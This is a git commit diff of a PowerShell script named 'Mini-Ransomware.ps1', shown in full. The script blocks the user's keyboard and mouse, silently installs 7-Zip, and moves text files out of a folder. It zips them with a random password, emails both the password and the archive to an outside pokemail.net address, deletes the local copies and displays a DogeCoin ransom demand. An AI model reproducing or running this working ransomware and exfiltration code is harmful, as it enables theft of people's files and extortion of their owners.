94c3193843a84f9be5cfcae0dbf871761403fcd5
Praneeth Marella <praneethmarella@icloud.com>
2017-09-12 00:47:25 -0600

    Added warning message and temporary user input block

--- Mini-Ransomware.ps1
+++ Mini-Ransomware.ps1
@@ -1,16 +1,13 @@
 #Temporarily disable user mouse and keyboard input
-
 $code = @"
     [DllImport("user32.dll")]
     public static extern bool BlockInput(bool fBlockIt);
 "@
 
 $userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru
-
 $userInput::BlockInput($true)
 
 #Install 7zip to zip files
-
 $workdir = "c:\installer\"
 
 If (Test-Path -Path $workdir -PathType Container)
@@ -19,7 +16,6 @@ ELSE
 { New-Item -Path $workdir  -ItemType directory }
 
 #Download the installer
-
 $source = "http://www.7-zip.org/a/7z1604-x64.msi"
 $destination = "$workdir\7-Zip.msi"
 
@@ -37,51 +33,39 @@ else
 Invoke-WebRequest $source -OutFile $destination 
 
 #Start the installation
-
 msiexec.exe /i "$workdir\7-Zip.msi" /qb
 
-#Wait 20 Seconds for the installation to finish
-
-Start-Sleep -s 5
+#Wait a few Seconds for the installation to finish
+Start-Sleep -s 10
 
 #Remove the installer
-
 rm -Force $workdir\7*
 
-
-
 #Set source and destination of files to copy and store
-
 $Source = "C:\Users\PraneethBabu Marella\Desktop\StealableFiles"
 $Destination = "C:\Users\PraneethBabu Marella\Desktop\StolenFiles"
 
 #Copy all files with certain extension and delete them in the source location
-
 $cp = robocopy /mov $Source $Destination *.txt /s
 
 #Generate a random 8 character password
-
 [Reflection.Assembly]::LoadWithPartialName("System.Web")
 $randomPassword = [System.Web.Security.Membership]::GeneratePassword(8,2)
 
 #Set source for 7zip exe (usually the same path in most basic computers)
-
 $pathTo64Bit7Zip = "C:\Program Files\7-Zip\7z.exe"
 
 #Zip destination folder with the random password previously generated
-
 $arguments = "a -tzip ""$Destination"" ""$Destination"" -mx9 -p$randomPassword"
 $windowStyle = "Normal"
 $p = Start-Process $pathTo64Bit7Zip -ArgumentList $arguments -Wait -PassThru -WindowStyle $windowStyle
 
 #Delete the destination folder
-
 $del = Remove-Item $Destination -Force -Recurse
 
 $email = "ucjmyqhi@pokemail.net"
 
 #Send password for files to your e-mail
-
 $SMTPServer = "smtp.pokemail.net"
 $Mailer = new-object Net.Mail.SMTPclient($SMTPServer)
 $From = $email
@@ -95,8 +79,6 @@ $Msg.Dispose()
 $Mailer.Dispose()
 
 #Send zip folder to your e-mail
-
-#Start-Sleep -s 15
 $ZipFolder = "C:\Users\PraneethBabu Marella\Desktop\StolenFiles.zip"
 $SMTPServer = "smtp.pokemail.net"
 $Mailer = new-object Net.Mail.SMTPclient($SMTPServer)
@@ -117,12 +99,11 @@ $Mailer.Dispose()
 $del = Remove-Item $ZipFolder -Force -Recurse
 
 #Disable temporary user keyboard and mouse input block
-
 $userInput::BlockInput($false)
 
 #Display a message demanding money
-
 #Add the required .NET assembly for message display
 Add-Type -AssemblyName System.Windows.Forms
+
 #Show the message
 $result = [System.Windows.Forms.MessageBox]::Show('We have your files!!! We demand 2500 DogeCoins for their return.', '!-Notice-!', 'Ok', 'Warning')
